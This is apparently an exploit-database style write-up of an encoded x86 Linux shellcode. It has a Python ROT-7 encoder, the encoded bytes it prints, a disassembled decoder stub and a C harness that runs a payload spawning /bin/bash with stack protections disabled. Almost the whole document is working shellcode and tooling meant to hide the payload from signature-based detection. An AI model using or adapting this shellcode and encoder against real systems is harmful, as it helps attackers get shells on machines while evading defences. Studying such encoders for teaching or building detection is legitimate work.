/*

 ROT-7 Decoder Shellcode - Linux Intel/x86
 Author: Stavros Metzidakis

*/


a) Python ROT-7 encoder for shellcode (execve-stack)
---------------------------------------------------------------------------------------
#!/usr/bin/python

# Python ROT-7 Encoder

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
# boundary is computed as 255-ROT(x) where x, the amount to rotate by
    if x > 248:
        encoded += '\\x'
        encoded += '%02x' %(7 -(256 - x))
        encoded2 += '0x'
        encoded2 += '%02x,' %(7 -(256 - x))
    else:
        encoded += '\\x'
        encoded += '%02x'%(x+7)
        encoded2 += '0x'
        encoded2 += '%02x,' %(x+7)
    

print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
---------------------------------------------------------------------------------------
Test run:
$ ./rot-7-encoder.py
Encoded shellcode ...
\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87
0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87,
Len: 30




b) Decoder for a ROT-7 encoded shellcode (execve-stack)
---------------------------------------------------------------------------------------
$objdump -d rot-7-decoder -M intel 

rot-7-decoder:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:   eb 25                   jmp    8048087 <call_decoder>

08048062 <decoder>:
 8048062:   5e                      pop    esi
 8048063:   31 c9                   xor    ecx,ecx
 8048065:   b1 1e                   mov    cl,0x1e              ;ROTed shellcode length goes here

08048067 <decode>:
 8048067:   80 3e 07                cmp    BYTE PTR [esi],0x7
 804806a:   7c 05                   jl     8048071 <lowbound>
 804806c:   80 2e 07                sub    BYTE PTR [esi],0x7
 804806f:   eb 11                   jmp    8048082 <common_commands>

08048071 <lowbound>:
 8048071:   31 db                   xor    ebx,ebx
 8048073:   31 d2                   xor    edx,edx
 8048075:   b3 07                   mov    bl,0x7
 8048077:   b2 ff                   mov    dl,0xff
 8048079:   66 42                   inc    dx
 804807b:   2a 1e                   sub    bl,BYTE PTR [esi]
 804807d:   66 29 da                sub    dx,bx
 8048080:   88 16                   mov    BYTE PTR [esi],dl

08048082 <common_commands>:
 8048082:   46                      inc    esi
 8048083:   e2 e2                   loop   8048067 <decode>
 8048085:   eb 05                   jmp    804808c <Shellcode>

08048087 <call_decoder>:
 8048087:   e8 d6 ff ff ff          call   8048062 <decoder>

0804808c <Shellcode>:                               ;ROTed shellcode
 804808c:   38 c7                   cmp    bh,al
 804808e:   57                      push   edi
 804808f:   6f                      outs   dx,DWORD PTR ds:[esi]
 8048090:   69 68 7a 6f 6f 69 70    imul   ebp,DWORD PTR [eax+0x7a],0x70696f6f
 8048097:   75 36                   jne    80480cf <Shellcode+0x43>
 8048099:   6f                      outs   dx,DWORD PTR ds:[esi]
 804809a:   36                      ss
 804809b:   36                      ss
 804809c:   36                      ss
 804809d:   36                      ss
 804809e:   90                      nop
 804809f:   ea 57 90 e9 5a 90 e8    jmp    0xe890:0x5ae99057
 80480a6:   b7 12                   mov    bh,0x12
 80480a8:   d4 87                   aam    0x87
---------------------------------------------------------------------------------------


$ cat shellcode.c

#include <stdio.h>
#include <string.h>

unsigned char code[] = "\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87";

main()
{

    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();

}


$ gcc ./shellcode.c -fno-stack-protector -z execstack -o shellcode
$ ./shellcode
Shellcode Length:  74
$